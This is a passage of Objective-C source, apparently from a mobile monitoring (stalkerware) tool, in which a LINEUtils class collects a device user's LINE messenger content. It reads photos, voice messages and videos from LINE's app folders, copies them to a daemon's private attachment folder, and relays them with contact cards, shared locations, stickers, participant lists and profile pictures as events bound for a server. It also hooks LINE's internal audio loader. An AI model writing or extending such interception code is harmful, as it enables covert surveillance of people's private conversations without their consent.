			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants

							   photoData: (NSData *) aPhotoData
						   thumbnailData: (NSData *) aThumbnailData
                                  hidden: (BOOL) aIsHidden {
    
	NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
    
	FxAttachment *attachment	= [LINEUtils createPhotoAttachment:aPhotoData thumbnail: aThumbnailData];
    
	NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
    
	[pool drain];
    
	/********************************
	 *			FxIMEvent [Image]
	 ********************************/
    
    FxIMMessageRepresentation textRep = kIMMessageNone;
    if (aIsHidden)
        textRep = textRep | kIMMessageHidden;
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData
								userLocation:nil
					   messageRepresentation:textRep
									 message:nil										// No message for image
								   direction:aDirection
							  conversationID:aConversationID
							conversationName:aConversationName
				  conversationProfilePicture:aConversationProfilePicture
								participants:aParticipants
								 attachments:attachments
							   shareLocation:nil];					// one photo as an attachment
	[attachments release];
	attachments = nil;
}

#pragma mark Audio


+ (void) sendAudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   audioPath: (NSString *) aAudioPath {
	/********************************
	 *			FxIMEvent [Audio]
	 ********************************/
	
	/* get audio data from the line application
	 * For outgoing audio, it is saved in APPFOLDER/tmp/xxxx.m4a
	 * For incoming audio, it is saved in APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
	 */	
	// -- OUTGOING -----------------------------------------------------------------------------------
	if (aDirection == kEventDirectionOut) {
		NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];		
		NSString *pathExtension		= [aAudioPath pathExtension];
		
		// e.g., /private/var/mobile/Applications/5E3BEFC5-134F-4797-AF36-0F2425C89E50/tmp/_131076.m4a
		NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];		
		FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData 
																     fileExtension:pathExtension];
		[audioData release];
		audioData = nil;
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];		
		[pool drain];				
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for image
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];					
		[attachments release];
		attachments = nil;		
	} 	
	// -- INCOMING -----------------------------------------------------------------------------------
	else {
		//APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
		DLog (@">>>>> INCOMING aAudioPath %@", aAudioPath)		
		
		// -- AUDIO FILE HAS BEEN DOWNLOADED
		if ([[NSFileManager defaultManager] fileExistsAtPath:aAudioPath]) {
			DLog (@">>>>> File exists")
			NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
			NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];
			NSString *pathExtension		= [aAudioPath pathExtension];			
			FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData
																		 fileExtension:pathExtension];	
			[audioData release];
			audioData = nil;
			NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
			DLog (@"attachments %@", attachments)
			[pool drain];
							
			[LINEUtils sendAnyContentTypeEventUserID:aUserID
									 userDisplayName:aUserDisplayName 
								   userStatusMessage:aUserStatusMessage
							  userProfilePictureData:aUserProfilePictureData 
										userLocation:nil 
							   messageRepresentation:kIMMessageNone								
											 message:nil										// No message for image
										   direction:aDirection 
									  conversationID:aConversationID 
									conversationName:aConversationName 
						  conversationProfilePicture:aConversationProfilePicture 
										participants:aParticipants 
										 attachments:attachments
									   shareLocation:nil];				
			[attachments release];
			attachments = nil;
			
		} 
		// -- AUDIO FILE HAS "NOT" BEEN DOWNLOADED
		else {		
			DLog (@"***********************************")
			DLog (@"NOT FOUND AUDIO, so send only mime type")
			DLog (@"***********************************")		
			FxAttachment *attachment = [[FxAttachment alloc] init];
			[attachment setFullPath:@"audio/mp4"];				// hard code mime type					
			NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
			[attachment release];
			
			[LINEUtils sendAnyContentTypeEventUserID:aUserID
									 userDisplayName:aUserDisplayName 
								   userStatusMessage:aUserStatusMessage
							  userProfilePictureData:aUserProfilePictureData 
										userLocation:nil 
							   messageRepresentation:kIMMessageNone								
											 message:nil										// No message for image
										   direction:aDirection 
									  conversationID:aConversationID 
									conversationName:aConversationName 
						  conversationProfilePicture:aConversationProfilePicture 
										participants:aParticipants 
										 attachments:attachments
									   shareLocation:nil];				
			[attachments release];
			attachments = nil;
			
		}
	}
}


+ (void) send2AudioContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants														

							   audioPath: (NSString *) aAudioPath {
	
	DLog (@"====== constructing dictionary of line info =====")
	NSMutableDictionary *lineInfo = [[NSMutableDictionary alloc] initWithObjectsAndKeys:aUserID, kLineUserIdKey, nil];
	if (aUserDisplayName)			[lineInfo setObject:aUserDisplayName forKey:kLineUserDisplayNameKey];			
	if (aUserStatusMessage)			[lineInfo setObject:aUserStatusMessage forKey:kLineUserStatusMessageKey];
	if (aUserProfilePictureData)	[lineInfo setObject:aUserProfilePictureData forKey:kLineSenderImageProfileDataKey];			
	[lineInfo setObject:[NSNumber numberWithInt:aDirection] forKey:kLineDirectionKey];			
	if (aConversationID)			[lineInfo setObject:aConversationID forKey:kLineConversationIDKey];
	if (aConversationName)			[lineInfo setObject:aConversationName forKey:kLineConversationNameKey];						
	if (aConversationProfilePicture)	[lineInfo setObject:aConversationProfilePicture forKey:kLineConversationProfilePicDataKey];
	if (aParticipants)				[lineInfo setObject:aParticipants forKey:kLineParticipantsKey];
	if (aAudioPath)					[lineInfo setObject:aAudioPath forKey:kLineAudioPathKey];			
	DLog (@"--->>>>> lineInfo %@", lineInfo)
	
	[NSThread detachNewThreadSelector:@selector(sendLINEInfo:) 
							 toTarget:[LINEUtils class]
						   withObject:lineInfo];
	[lineInfo release];	
}

+ (void) sendLINEInfo: (NSDictionary *) aLineInfo {
	NSString *userId				= [aLineInfo objectForKey:kLineUserIdKey];
	NSString *userDisplayName		= [aLineInfo objectForKey:kLineUserDisplayNameKey];
	NSString *userStatusMessage		= [aLineInfo objectForKey:kLineUserStatusMessageKey];
	NSData *senderImageProfileData	= [aLineInfo objectForKey:kLineSenderImageProfileDataKey];
	FxEventDirection direction		=  (FxEventDirection) [[aLineInfo objectForKey:kLineDirectionKey] intValue];	
	NSString *conversationID		= [aLineInfo objectForKey:kLineConversationIDKey];
	NSString *conversationName		= [aLineInfo objectForKey:kLineConversationNameKey];
	NSData *conversationProfilePicData = [aLineInfo objectForKey:kLineConversationProfilePicDataKey];	
	NSArray *participants			= [aLineInfo objectForKey:kLineParticipantsKey];
	NSString *audioPath				= [aLineInfo objectForKey:kLineAudioPathKey];
	
	[NSThread sleepForTimeInterval:kAudioDownloadDelay];
	
	DLog (@"!!!!!!!!!!!!!! sendAudioContentTypeEventUserID !!!!!!!!!!!")
	[LINEUtils sendAudioContentTypeEventUserID:userId
							   userDisplayName:userDisplayName
							 userStatusMessage:userStatusMessage
						userProfilePictureData:senderImageProfileData 
									 direction:direction 
								conversationID:conversationID
							  conversationName:conversationName
					conversationProfilePicture:conversationProfilePicData
								  participants:participants 
									 audioPath:audioPath];
	
}

+ (void) loadAudio: (id) aMessageID {
	DLog (@"!!!!!!!!!!!!!!!!!!!!!!! loading audio !!!!!!!!!!!!!!!!!!")
	Class $NLAudioURLLoader		= objc_getClass("NLAudioURLLoader");
	NLAudioURLLoader *loader	= [[$NLAudioURLLoader alloc] init];
    if ([loader respondsToSelector:@selector(loadAudioWithObjectID:knownDownloadURL:)]) {
        [loader loadAudioWithObjectID:aMessageID knownDownloadURL:nil];
    }
//    else if ([loader respondsToSelector:@selector(loadAudioWithObjectID:knownDownloadURL:obsPopInfo:)]) {
//        DLog(@"new vesion of audio loader")
//        // Cannot load actual audio
//        //[loader loadAudioWithObjectID:aMessageID knownDownloadURL:nil obsPopInfo:nil];
//    }

	[loader release];
}

#pragma mark Video


#pragma mark VideoDownloadDelegate Protocol

- (void) videoDidFinishDownload: (NSDictionary *) aInfo {
    DLog(@"aInfo %@", aInfo)
    BOOL isVideoDownloadSuccess = [(NSNumber *)[aInfo objectForKey:kIsSuccessKey] boolValue];
    
    NSDictionary *sendingInfo   = [aInfo objectForKey:kRelayInfoKey];
    NSArray *attachments = nil;
    if (isVideoDownloadSuccess) {
        DLog(@"successfully download video to %@", aInfo[kVideoOutputKey])
        
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setFullPath:aInfo[kVideoOutputKey]];
        
        attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
        [attachment release];
        attachment = nil;
    } else {
        DLog(@"fail to download video")
        FxAttachment *attachment    = [[FxAttachment alloc] init];
        NSString *fileExtension     = aInfo[kVideoOutputExtensionKey];
        NSString *mimeType          = @"video/MOV";
        if (fileExtension)
            mimeType = [NSString stringWithFormat:@"video/%@",fileExtension];
        [attachment setFullPath:mimeType];
        attachments                 = [[NSArray alloc] initWithObjects:attachment, nil];
        [attachment release];
        attachment = nil;
    }
    
    [LINEUtils sendAnyContentTypeEventUserID:sendingInfo[kVideoDownloadOPUserID]
                             userDisplayName:sendingInfo[kVideoDownloadOPUserName]
                           userStatusMessage:sendingInfo[kVideoDownloadOPUserStatusMessage]
                      userProfilePictureData:sendingInfo[kVideoDownloadOPUserPic]
                                userLocation:nil
                       messageRepresentation:kIMMessageNone
                                     message:nil										// No message for video
                                   direction:kEventDirectionOut
                              conversationID:sendingInfo[kVideoDownloadOPConverID]
                            conversationName:sendingInfo[kVideoDownloadOPConverName]
                  conversationProfilePicture:sendingInfo[kVideoDownloadOPConverPic]
                                participants:sendingInfo[kVideoDownloadOPParticipants]
                                 attachments:attachments
                               shareLocation:nil];
    
    [attachments release];
    
}


+ (void) sendVideoContentTypeEventUserID: (NSString *) aUserID						// user id
						 userDisplayName: (NSString *) aUserDisplayName				// user display name
					   userStatusMessage: (NSString *) aUserStatusMessage			// user status message
				  userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

							   direction: (FxEventDirection) aDirection				// direction

						  conversationID: (NSString *) aConversationID				// conversation id
						conversationName: (NSString *) aConversationName			// conversation name
			  conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							participants: (NSArray *) aParticipants	
							   audioPath: (NSString *) aAudioPath {
	
	/********************************
	 *			FxIMEvent [Video]
	 ********************************/
			
	/* get audio data from the line application
	 * For outgoing video, it is saved in APPFOLDER/tmp/
	 * For incoming video, it is saved in APPFOLDER/Library/Application Support/Message Attachment/USERID/xxxx.mp4
	 */	
	if (aDirection == kEventDirectionOut) {
	
		NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
        
		DLog(@"video path %@", aAudioPath);
        
		//NSString *tempDir = NSTemporaryDirectory();
		//DLog (@"tempDir %@", tempDir)
		
		// e.g., /private/var/mobile/Applications/5E3BEFC5-134F-4797-AF36-0F2425C89E50/tmp/trim.phvP9N.MOV
        // e.g., assets-library://asset/asset.mp4?id=72C8E508-1EC9-4A9F-B5AF-39435ECED4B0&ext=mp4
        
        
        // Note that if path is inform of concreate path, we will get NSData from the below function, otherwise the second solution will further be executed
		NSData *audioData			= [[NSData alloc] initWithContentsOfFile:aAudioPath];
		DLog(@">>> video data %lu",  (unsigned long)[audioData length]);
        
        // -- Video Path is concrete path
        if (!audioData) {
            DLog(@"LOSS VIDEO")
            
            // -- Construct Relay Information for the callback to send this information to daemon
            NSMutableDictionary *relayInfo                  = [[NSMutableDictionary alloc] init];
            if (aUserID) relayInfo[kVideoDownloadOPUserID]                          = aUserID;
            if (aUserDisplayName) relayInfo[kVideoDownloadOPUserName]               = aUserDisplayName;
            if (aUserStatusMessage) relayInfo[kVideoDownloadOPUserStatusMessage]    = aUserStatusMessage;
            if (aUserProfilePictureData) relayInfo[kVideoDownloadOPUserPic]         = aUserProfilePictureData;
            if (aConversationID) relayInfo[kVideoDownloadOPConverID]                = aConversationID;
            if (aConversationName) relayInfo[kVideoDownloadOPConverName]            = aConversationName;
            if (aConversationProfilePicture) relayInfo[kVideoDownloadOPConverPic]   = aConversationProfilePicture;
            if (aParticipants) relayInfo[kVideoDownloadOPParticipants]              = aParticipants;
            
            // -- Create path for 2nd solution
            NSString* lineAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
            lineAttachmentPath				= [LINEUtils getOutputPath:lineAttachmentPath extension:@"MOV"];  // Note that this extension may be replaced later
            DLog (@"attachment for 2nd solution %@", lineAttachmentPath)

            // Create new operation to download video
            VideoDownloadOperation *videoDownloadOP = [[VideoDownloadOperation alloc] initWithVideoPath:aAudioPath
                                                                                             outputPath:lineAttachmentPath
                                                                                               delegate:[LINEUtils shareLINEUtils]];
            [videoDownloadOP setMReleyInfo:relayInfo];
            [relayInfo release];

            [[[LINEUtils shareLINEUtils] mLineVideoDownloadQueue] addOperation:videoDownloadOP];

            DLog(@"Added video download operation")
            
            [videoDownloadOP release];
            videoDownloadOP = nil;
        }
        // -- Video Path is asset url path
        else {
            DLog(@"GOT VIDEO from path directly")
            FxAttachment *attachment	= [LINEUtils createAudioVideoAttachmentForData:audioData
                                                                         fileExtension:@"MOV"];
            [audioData release];
            NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
            
            [LINEUtils sendAnyContentTypeEventUserID:aUserID
                                     userDisplayName:aUserDisplayName 
                                   userStatusMessage:aUserStatusMessage
                              userProfilePictureData:aUserProfilePictureData 
                                        userLocation:nil 
                               messageRepresentation:kIMMessageNone								
                                             message:nil										// No message for video
                                           direction:aDirection 
                                      conversationID:aConversationID 
                                    conversationName:aConversationName 
                          conversationProfilePicture:aConversationProfilePicture 
                                        participants:aParticipants 
                                         attachments:attachments
                                       shareLocation:nil];			
            [attachments release];
            attachments = nil;
        }
        
        [pool drain];
	}
	else {
		DLog (@"***********************************")
		DLog (@"NOT FOUND VIDEO, so not send event to the server")
		DLog (@"***********************************")
		
		FxAttachment *attachment = [[FxAttachment alloc] init];
		[attachment setFullPath:@"video/mp4"];				// hard code mime type
		
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
		[attachment release];
		
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageNone								
										 message:nil										// No message for video
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments
								   shareLocation:nil];				
		[attachments release];
		attachments = nil;
		
	}
}


#pragma mark Contact


+ (void) sendContactContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage			// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName			// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							  participants: (NSArray *) aParticipants														

							  contactModel: (ContactModel *) aContactModel {
	/********************************
	 *			FxIMEvent [Contact]
	 ********************************/
	
	//TalkUserObject *user		= [aContactModel userObjectWithMid:[aContactModel mid]];
	//NSString *lineName			= [user name]					?	[user name]: @"";
	//NSString *addressBookName	= [user addressbookName]		?	[user addressbookName]: @"";
	
	NSString *displayName		= [aContactModel displayName]	?	[aContactModel displayName] : @"" ;
	NSString *contactID			= [aContactModel mid]			?	[aContactModel mid] : @"";		
	DLog (@"LINE: contactID %@",		contactID)
	DLog (@"LINE: displayName %@",		displayName)
	
	//NSString *contact			= [[NSString alloc] initWithFormat:@"Name: %@, Account ID: %@", displayName, contactID];
	NSString *contact			= [[NSString alloc] initWithFormat:@"Name: %@", displayName];
	DLog (@"contact %@", contact)
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageContact								
									 message:contact										
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:nil
							   shareLocation:nil];
	[contact release];
	contactID = nil; // Prevent compile warning
		
}



+ (void) sendContactContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage			// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName			// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

							  participants: (NSArray *) aParticipants

							  contactModel: (ContactModel *) aContactModel
                                    hidden: (BOOL) aIsHidden {
	/********************************
	 *			FxIMEvent [Contact]
	 ********************************/
			
	NSString *displayName		= [aContactModel displayName]	?	[aContactModel displayName] : @"" ;
	NSString *contactID			= [aContactModel mid]			?	[aContactModel mid] : @"";
	DLog (@"LINE: contactID %@",		contactID)
	DLog (@"LINE: displayName %@",		displayName)
	
	//NSString *contact			= [[NSString alloc] initWithFormat:@"Name: %@, Account ID: %@", displayName, contactID];
	NSString *contact			= [[NSString alloc] initWithFormat:@"Name: %@", displayName];
	DLog (@"contact %@", contact)
    
    FxIMMessageRepresentation textRep = kIMMessageContact;
    if (aIsHidden)
        textRep = textRep | kIMMessageHidden;
    
    
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData
								userLocation:nil
					   messageRepresentation:textRep
									 message:contact
								   direction:aDirection
							  conversationID:aConversationID
							conversationName:aConversationName
				  conversationProfilePicture:aConversationProfilePicture
								participants:aParticipants
								 attachments:nil
							   shareLocation:nil];
	[contact release];
	contactID = nil; // Prevent compile warning
}




#pragma mark Shared Location


+ (void) sendSharedLocationContentTypeEventUserID: (NSString *) aUserID						// user id
								  userDisplayName: (NSString *) aUserDisplayName			// user display name
								userStatusMessage: (NSString *) aUserStatusMessage			// user status message
						   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

										direction: (FxEventDirection) aDirection			// direction

								   conversationID: (NSString *) aConversationID				// conversation id
								 conversationName: (NSString *) aConversationName			// conversation name
					   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

									 participants: (NSArray *) aParticipants			

									shareLocation: (FxIMGeoTag *) aSharedLocation {
	
	/********************************
	 *			FxIMEvent [Share Location]
	 ********************************/
	
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName 
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData 
								userLocation:nil 
					   messageRepresentation:kIMMessageShareLocation			
									 message:nil								
								   direction:aDirection 
							  conversationID:aConversationID 
							conversationName:aConversationName 
				  conversationProfilePicture:aConversationProfilePicture 
								participants:aParticipants 
								 attachments:nil
							   shareLocation:aSharedLocation];							
}



+ (void) sendSharedLocationContentTypeEventUserID: (NSString *) aUserID						// user id
								  userDisplayName: (NSString *) aUserDisplayName			// user display name
								userStatusMessage: (NSString *) aUserStatusMessage			// user status message
						   userProfilePictureData: (NSData *) aUserProfilePictureData		// user profile picture

										direction: (FxEventDirection) aDirection			// direction

								   conversationID: (NSString *) aConversationID				// conversation id
								 conversationName: (NSString *) aConversationName			// conversation name
					   conversationProfilePicture: (NSData *) aConversationProfilePicture	// conversation profile pic

									 participants: (NSArray *) aParticipants

									shareLocation: (FxIMGeoTag *) aSharedLocation
                                           hidden: (BOOL) aIsHidden {
	/********************************
	 *			FxIMEvent [Share Location]
	 ********************************/
	FxIMMessageRepresentation textRep = kIMMessageShareLocation;
    if (aIsHidden)
        textRep = textRep | kIMMessageHidden;
    
	[LINEUtils sendAnyContentTypeEventUserID:aUserID
							 userDisplayName:aUserDisplayName
						   userStatusMessage:aUserStatusMessage
					  userProfilePictureData:aUserProfilePictureData
								userLocation:nil
					   messageRepresentation:textRep
									 message:nil
								   direction:aDirection
							  conversationID:aConversationID
							conversationName:aConversationName
				  conversationProfilePicture:aConversationProfilePicture
								participants:aParticipants
								 attachments:nil
							   shareLocation:aSharedLocation];
}


#pragma mark Sticker


+ (void) sendStickerContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName				// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

							  participants: (NSArray *) aParticipants			

								 stickerID: (NSInteger) aStickerID
						  stickerPackageID: (NSString *) aStickerPackageID
					 stickerPackageVersion: (unsigned) aStickerPackageVersion {	
	
	NSData *stickerData	= [LINEUtils getStickerDataForStickerID:aStickerID	
											   stickerPackageID:aStickerPackageID
										  stickerPackageVersion:aStickerPackageVersion];	
	if (stickerData) {
		FxAttachment *attachment	= [LINEUtils createStickerAttachment:stickerData];		
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
								
		/********************************
		 *			FxIMEvent [Sticker]
		 ********************************/
		
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName 
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData 
									userLocation:nil 
						   messageRepresentation:kIMMessageSticker					// Sticker !!!
										 message:nil								// No message for Sticker
									   direction:aDirection 
								  conversationID:aConversationID 
								conversationName:aConversationName 
					  conversationProfilePicture:aConversationProfilePicture 
									participants:aParticipants 
									 attachments:attachments						// one Sticker in array
								   shareLocation:nil];
		[attachments release];
	} else {
		DLog (@"***********************************")
		DLog (@"NOT FOUND STICKER, so not send event to the server")
		DLog (@"***********************************")
	}
}

+ (void) sendStickerContentTypeEventUserID: (NSString *) aUserID						// user id
						   userDisplayName: (NSString *) aUserDisplayName				// user display name
						 userStatusMessage: (NSString *) aUserStatusMessage				// user status message
					userProfilePictureData: (NSData *) aUserProfilePictureData			// user profile picture

								 direction: (FxEventDirection) aDirection				// direction

							conversationID: (NSString *) aConversationID				// conversation id
						  conversationName: (NSString *) aConversationName				// conversation name
				conversationProfilePicture: (NSData *) aConversationProfilePicture		// conversation profile pic

							  participants: (NSArray *) aParticipants

								 stickerID: (NSInteger) aStickerID
						  stickerPackageID: (NSString *) aStickerPackageID
					 stickerPackageVersion: (unsigned) aStickerPackageVersion
                                    hidden: (BOOL) aIsHidden {
	
	NSData *stickerData	= [LINEUtils getStickerDataForStickerID:aStickerID
											   stickerPackageID:aStickerPackageID
										  stickerPackageVersion:aStickerPackageVersion];
	if (stickerData) {
		FxAttachment *attachment	= [LINEUtils createStickerAttachment:stickerData];
		NSArray *attachments		= [[NSArray alloc] initWithObjects:attachment, nil];
        
		/********************************
		 *			FxIMEvent [Sticker]
		 ********************************/
        
        FxIMMessageRepresentation textRep = kIMMessageSticker;
        if (aIsHidden)
            textRep = textRep | kIMMessageHidden;
    
		[LINEUtils sendAnyContentTypeEventUserID:aUserID
								 userDisplayName:aUserDisplayName
							   userStatusMessage:aUserStatusMessage
						  userProfilePictureData:aUserProfilePictureData
									userLocation:nil
						   messageRepresentation:textRep                            // Sticker !!!
										 message:nil								// No message for Sticker
									   direction:aDirection
								  conversationID:aConversationID
								conversationName:aConversationName
					  conversationProfilePicture:aConversationProfilePicture
									participants:aParticipants
									 attachments:attachments						// one Sticker in array
								   shareLocation:nil];
		[attachments release];
	} else {
		DLog (@"***********************************")
		DLog (@"NOT FOUND STICKER, so not send event to the server")
		DLog (@"***********************************")
	}
}



#pragma mark -
#pragma mark IM (private method)
#pragma mark -

/*
- (void) thread: (FxIMEvent *) aIMEvent {		
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"LINE message after remove emoji = %@", msg);
		if ([msg length]															||	// for Text
			[aIMEvent mRepresentationOfMessage] == kIMMessageShareLocation			||	// for Share location
			([aIMEvent mAttachments] && [[aIMEvent mAttachments] count] != 0)		){	// for Image
			[aIMEvent setMMessage:msg];			
			NSMutableData* data = [[NSMutableData alloc] init];
			
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:aIMEvent forKey:kLINEArchived];
			[archiver finishEncoding];
			[archiver release];	
			
			// -- first port
			MessagePortIPCSender *messagePortSender1 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort1];			
			BOOL isSendingOK = [messagePortSender1 writeDataToPort:data];
			DLog (@"Sending to first port %d", isSendingOK)
			if (!isSendingOK) {
				DLog (@"First sending LINE fail");
				MessagePortIPCSender *messagePortSender2 = [[MessagePortIPCSender alloc] initWithPortName:kLINEMessagePort2];
				isSendingOK = [messagePortSender2 writeDataToPort:data];
				if (!isSendingOK) {
					DLog (@"Second sending LINE also fail");										
					[LINEUtils deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];					
				}
				[messagePortSender2 release];
			}
		
			[messagePortSender1 release];
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}	
	[pool release];
}
*/

#pragma mark Photo Attachment Utils


+ (FxAttachment *) createPhotoAttachment: (NSData *) aImageData thumbnail: (NSData *) aThumbnailData {
	// -- create path
	NSString* lineAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
	lineAttachmentPath				= [LINEUtils getOutputPath:lineAttachmentPath extension:@"jpg"];
	DLog (@"attachment %@", lineAttachmentPath)
	
	// -- write image to document file
	if (aImageData)
		[aImageData writeToFile:lineAttachmentPath atomically:YES];
	
	// -- create FxAttachment
	FxAttachment *attachment = [[FxAttachment alloc] init];
	if (aImageData)
		[attachment setFullPath:lineAttachmentPath];
	else	
		[attachment setFullPath:@"image/jpeg"];
	[attachment setMThumbnail:aThumbnailData];
	
	return [attachment autorelease];
}

// create timestamp of now
+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

// get thumbnail path with its extension
+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
	// delete the attachment files
	if (aAttachmentArray && [aAttachmentArray count] != 0) {
		for (FxAttachment *attachment in aAttachmentArray) {
			NSString *path = [attachment fullPath];
			DLog (@"deleting file: %@", path)
			[[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		}	
	}
}


#pragma mark Audio Attachment Utils
//+ (FxAttachment *) createAudioAttachmentForAudioData: (NSData *) aAudioData {
+ (FxAttachment *) createAudioVideoAttachmentForData: (NSData *) aAudioData 
									   fileExtension: (NSString *) aExtension  {
	// -- create path
	NSString* lineAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
	lineAttachmentPath				= [LINEUtils getOutputPath:lineAttachmentPath extension:aExtension];	
	DLog (@"attachment %@", lineAttachmentPath)
	
	// -- create FxAttachment
	FxAttachment *attachment = nil;
	
	// -- write image to document file
	if (aAudioData) {
		attachment = [[FxAttachment alloc] init];
		[aAudioData writeToFile:lineAttachmentPath atomically:YES];
		[attachment setFullPath:lineAttachmentPath];
		//[attachment setMThumbnail:aThumbnailData];	// audio has no thumbnail
	}
	
	return [attachment autorelease];
}

